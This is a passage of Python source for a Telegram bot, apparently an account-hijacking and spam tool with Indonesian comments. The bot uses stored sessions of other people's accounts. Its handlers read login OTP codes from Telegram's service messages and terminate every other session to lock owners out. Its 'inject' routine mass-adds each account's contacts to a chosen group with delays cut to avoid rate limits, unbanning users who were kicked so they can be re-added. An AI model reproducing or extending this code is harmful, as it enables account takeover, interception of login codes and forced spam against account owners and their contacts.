                    await event.answer("❌ Akun ini telah logout dari perangkat ini.", alert=True)
                except:
                    await event.respond(
                        "❌ Akun ini telah logout dari perangkat ini.",
                        buttons=[Button.inline("OK", "delete")]
                    )


        # =========================
        # SEDOT (tetap edit, karena ini flow di pesan detail)
        # =========================
        elif callback_data.startswith("sedot-"):
            try:
                _ = await acd(GetContactsRequest(hash=0))
                waiting_for_link[user_id] = {
                    "status": "awaiting_group_link",
                    "nomor": phonenumber,
                }
                session_user_path = os.path.join(path, "sessions", f"tenant_{tenant_id}", "users")
                await event.edit(
                    "📩 Silahkan kirim link grup dengan format:\n"
                    "https://t.me/+XXXXXXXXXXX",
                    buttons=[Button.inline("❌ Cancel", "delete")]
                )
            except Exception as e:
                print(f"Error in sedot: {e}")
                try:
                    await event.answer("Akun ini telah logout dari perangkat ini.", alert=True)
                except:
                    await event.edit(
                        "❌ Akun ini telah logout dari perangkat ini.",
                        buttons=[Button.inline("OK", "delete")]
                    )

        # =========================
        # INJECT (tetap)
        # =========================
        elif callback_data.startswith(("inject1-", "inject3-", "inject7-")):
            linkgrup = split[2]
            days_map = {"inject1": 1, "inject3": 3, "inject7": 7}
            days = days_map.get(method, 7)

            try:
                await event.answer("⏳ Sedang memproses...", alert=False)
            except:
                pass

            try:
                group = await acd(ImportChatInviteRequest(linkgrup))
                group_entity = group.chats[0]
            except UserAlreadyParticipantError:
                group_entity = await acd.get_entity(f"https://t.me/+{linkgrup}")
            except InviteHashExpiredError:
                await event.edit("❌ Link grup sudah expired.", buttons=[Button.inline("OK", "delete")])
                return
            except Exception as e:
                await event.edit(f"❌ Gagal bergabung ke grup: {str(e)}", buttons=[Button.inline("OK", "delete")])
                return

            contacts = await acd(GetContactsRequest(hash=0))
            active_contacts = get_active_contacts(contacts, days=days)

            invited = readJSON(fInvited)
            group_id_str = str(group_entity.id)
            existing_invited = invited.get(group_id_str, [])
            new_invited = []
            sent = 0
            fail = 0
            skipped = 0

            await event.edit(f"🔄 Memproses {len(active_contacts)} kontak...\n⏳ Mohon tunggu...")

            for idx, contact in enumerate(active_contacts, 1):
                if contact.id in existing_invited:
                    skipped += 1
                    continue

                try:
                    if isinstance(group_entity, types.Channel):
                        await acd(InviteToChannelRequest(channel=group_entity, users=[contact.id]))
                    else:
                        await acd(functions.messages.AddChatUserRequest(
                            chat_id=group_entity.id,
                            user_id=contact.id,
                            fwd_limit=50
                        ))
                    sent += 1
                    new_invited.append(contact.id)

                    # AKSELERASI MAUT: Update progress bar setiap 10 target (agar tidak flood wait)
                    if idx % 10 == 0:
                        try:
                            await event.edit(
                                f"🔄 Progress: {idx}/{len(active_contacts)}\n"
                                f"✅ Berhasil: {sent}\n"
                                f"❌ Gagal: {fail}\n"
                                f"⏭️ Dilewati: {skipped}"
                            )
                        except:
                            pass

                    # Mengubah Rem 5 Detik menjadi 0.5 Detik
                    await asyncio.sleep(0.5)

                except UserAlreadyParticipantError:
                    existing_invited.append(contact.id)
                    skipped += 1

                except UserKickedError:
                    if isinstance(group_entity, types.Channel):
                        try:
                            await acd(functions.channels.EditBannedRequest(
                                channel=group_entity,
                                participant=contact.id,
                                banned_rights=types.ChatBannedRights(
                                    until_date=None,
                                    view_messages=False,
                                    send_messages=False,
                                    send_media=False,
                                    send_stickers=False,
                                    send_gifs=False,
                                    send_games=False,
                                    send_inline=False,
                                    embed_links=False
                                )
                            ))
                            await asyncio.sleep(0.2)
                            await acd(InviteToChannelRequest(channel=group_entity, users=[contact.id]))
                            sent += 1
                            new_invited.append(contact.id)
                            await asyncio.sleep(0.5)
                        except Exception as e:
                            print(f"Gagal unban dan invite {contact.first_name}: {e}")
                            fail += 1
                    else:
                        fail += 1

                except Exception as e:
                    error_msg = str(e)
                    if "already a participant" in error_msg.lower():
                        existing_invited.append(contact.id)
                        skipped += 1
                    else:
                        print(f"Gagal menambahkan {contact.first_name}: {e}")
                        fail += 1

            invited[group_id_str] = list(set(existing_invited + new_invited))
            saveJSON(fInvited, invited)

            result_msg = (
                f"✅ **Selesai!**\n\n"
                f"📊 **Hasil:**\n"
                f"✅ Berhasil ditambahkan: {sent}\n"
                f"❌ Gagal: {fail}\n"
                f"⏭️ Sudah ada/dilewati: {skipped}\n"
                f"📝 Total diproses: {len(active_contacts)}"
            )
            await event.edit(result_msg, buttons=[Button.inline("OK", "delete")])

        # =========================
        # READ OTP (tetap, tapi BACK harus support page)
        # =========================
        elif callback_data.startswith("readcode-"):
            msg = await acd.get_messages(777000, limit=100)
            for messe in msg:
                OTPCODE = re.search(r'\b(\d{5})\b', messe.text or "")
                if OTPCODE:
                    BTX = [
                        [Button.inline("REFRESH 🔄", f"readcode-{phonenumber}")],
                        # ✅ balik ke detail, support page (kalau detail kamu pakai accountInfo-{phone}-{page})
                        [Button.inline("< BACK", f"accountInfo-{phonenumber}-{page}"), btn_delete]
                    ]
                    await event.edit(
                        f"**Your login code:** `{OTPCODE.group(0)}`\n"
                        f"**Received:** {messe.date} (UTC)\n\n"
                        f"**Updated:** {todate(time.time())}",
                        buttons=BTX
                    )
                    break

        # =========================
        # LIST SESSION (tetap)
        # =========================
        elif callback_data.startswith("listsession-"):
            results = await acd(functions.account.GetAuthorizationsRequest())

            btn = []
            sbtn = []

            username = ""
            if users[phonenumber].get('username'):
                username = f"| @{users[phonenumber]['username']}"

            i = 1
            addi = f"{users[phonenumber]['user_id']} {username} | {users[phonenumber]['name']}\n\n**Active sessions:**\n\n"
            for authorization in results.authorizations:
                addi += (
                    f"{i}. {authorization.device_model} | {authorization.country}\n"
                    f"**{authorization.app_name}**, {authorization.device_model}\n"
                    f"**Login:** {authorization.date_created}\n\n"
                )
                button = Button.inline(f"{i}", f"selectsessionhash-{phonenumber}-{authorization.hash}")
                sbtn.append(button)
                i += 1

            btn.append(sbtn)
            btn.append([Button.inline("DELETE ALL OTHER SESSIONS", f"clearAllSession-{phonenumber}")])
            btn.append([Button.inline("< BACK", f"accountInfo-{phonenumber}-{page}"), btn_delete])
            btn.append([Button.inline("DELETE DATA", f"deleteThis-{phonenumber}")])

            await event.edit(f"{addi}", buttons=btn)

        elif callback_data.startswith("selectsessionhash-"):
            gsplit = callback_data.replace(f"selectsessionhash-{phonenumber}-", "")
            results = await acd(functions.account.GetAuthorizationsRequest())

            sessionfound = False
            addi = f"{users[phonenumber]['user_id']} | {users[phonenumber]['name']}\n\n"
            for authorization in results.authorizations:
                if authorization.hash == int(gsplit):
                    addi += (
                        f"{authorization.device_model} | {authorization.country}\n"
                        f"**{authorization.app_name}**, {authorization.device_model}\n"
                        f"**Login:** {authorization.date_created}"
                    )
                    sessionfound = True
                    break

            if sessionfound:
                btn = [
                    [Button.inline("Logout", f"logout-{phonenumber}-{gsplit}")],
                    [Button.inline("< back", f"listsession-{phonenumber}"), btn_delete]
                ]
                await event.edit(addi, buttons=btn)
            else:
                try:
                    await event.answer("❌ Error: SessionHash not found", alert=True)
                except:
                    await event.edit("❌ Error: SessionHash not found", buttons=[Button.inline("OK", "delete")])

        elif callback_data.startswith("logout-"):
            newText = f"{message.text}\n\nApakah Anda yakin ingin logout dari perangkat ini?"
            gsplit = callback_data.replace(f"logout-{phonenumber}-", "")
            btn = [
                [Button.inline("Yakin 100%", f"surelogout-{phonenumber}-{gsplit}")],
                [Button.inline("< back", f"listsession-{phonenumber}"), btn_delete]
            ]
            await event.edit(newText, buttons=btn)

        elif callback_data.startswith("surelogout-"):
            gsplit = callback_data.replace(f"surelogout-{phonenumber}-", "")
            try:
                _ = await acd(functions.account.ResetAuthorizationRequest(hash=int(gsplit)))
                btn = [Button.inline("< back", f"listsession-{phonenumber}"), btn_delete]
                await event.edit(f"{message.text}\n**> Telah logout dari perangkat ini.**", buttons=btn)
            except Exception as e:
                print(f"Logout error: {e}")
                try:
                    await event.answer("⚠️ Belum dapat logout, coba beberapa saat (setelah 24 jam login di bot ini)", alert=True)
                except:
                    await event.edit("⚠️ Belum dapat logout, coba beberapa saat", buttons=[Button.inline("OK", "delete")])

        elif callback_data.startswith("clearAllSession-"):
            await event.edit(
                f"Apakah anda yakin ingin mengeluarkan akun {users[phonenumber]['user_id']} / {phonenumber} / @{users[phonenumber].get('username', '')} dari semua perangkat lain?",
                buttons=[
                    Button.inline("YES, 100%", f"sureClearAllSession-{phonenumber}"),
                    btn_delete
                ]
            )

        elif callback_data.startswith("sureClearAllSession-"):
            results = await acd(functions.account.GetAuthorizationsRequest())
            success = True

            for authorization in results.authorizations:
                if authorization.hash != 0:
                    hashv = authorization.hash
                    try:
                        await acd(functions.account.ResetAuthorizationRequest(hash=hashv))
                    except Exception as e:
                        print(f"Clear session error: {e}")
                        success = False
                        try:
                            await event.answer("⚠️ Belum dapat logout, coba beberapa saat (setelah 24 jam login di bot ini)", alert=True)
                        except:
                            await event.edit("⚠️ Belum dapat logout, coba beberapa saat", buttons=[Button.inline("OK", "delete")])
                        break

            if success:
                await event.edit(
                    f"✅ Berhasil mengeluarkan akun {users[phonenumber]['user_id']} / {phonenumber} / @{users[phonenumber].get('username', '')} dari semua perangkat lain",
                    buttons=[Button.inline("< BACK", f"accountInfo-{phonenumber}-{page}"), btn_delete]
                )

    except AuthKeyUnregisteredError:
        try:
            await event.answer("❌ Akun ini telah logout dari perangkat ini.", alert=True)
        except:
            try:
                await event.edit("❌ Akun ini telah logout dari perangkat ini.", buttons=[Button.inline("OK", "delete")])
            except:
                print("Failed to show logout message")
    except Exception as e:
        print(f"Error in callback handler: {e}")
        try:
            await event.answer(f"❌ Error: {str(e)}", alert=True)
        except:
            try:
                await event.edit(f"❌ Error: {str(e)}", buttons=[Button.inline("OK", "delete")])
            except:
                print(f"Failed to show error: {e}")
    finally:
        try:
            await acd.disconnect()
        except Exception:
            pass

    # Simpan perubahan users dan phase jika ada modifikasi
    # (hanya jalan setelah callback yang memang mengubah data seperti deleteThis, inject, dll)
    saveJSON(fUsers, users)
    saveJSON(fPhase, phase)


print("🚀 Program is running...")

bot.loop.create_task(watch_user_login(bot, admin, fUsers))

async def startup_notify():
    # Folder kunci untuk manajemen notifikasi lintas bot
    lock_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "locks")
    if not os.path.exists(lock_dir):
        try: os.makedirs(lock_dir, exist_ok=True)
        except: pass
        
    for a in set(admin):
        lock_file = os.path.join(lock_dir, f"lock_{a}.txt")
        
        # Cek apakah admin ini baru saja menerima notifikasi dalam 120 detik terakhir
        if os.path.exists(lock_file):
            try:
                mtime = os.path.getmtime(lock_file)
                if time.time() - mtime < 120:
                    print(f"[*] Admin {a} already notified by another bot. Skipping...")
                    continue
            except:
                pass

        try:
            await bot.send_message(int(a),
                "```\n"
                "░█░█░▀█░░▀█░░█▀▄░█▀█░▀█▀\n"
                "░░▀█░░█░░░█░░█▀▄░█░█░░█░\n"
                "░░░▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░░▀░\n"
                "[✦] 411 BOT X VERSAA [✦]```\n\n"
                "**411 BOT BROADCAST STARTED**\n"
                "notifikasi ini akan muncul setiap ada update dari server \n"
                "➜ /start untuk memulai kembali\n\n"
                "✦ Versaa")
            
            # Buat/Update file kunci sebagai tanda sudah lapor
            try:
                with open(lock_file, "w") as f:
                    f.write(str(time.time()))
            except:
                pass
                
        except Exception as e:
            print(f"Failed to send startup notif to {a}: {e}")

print(f"📱 Bot username: @{bot_username}")
print(f"👥 Admins: {admin}")

bot.loop.create_task(startup_notify())

bot.run_until_disconnected()

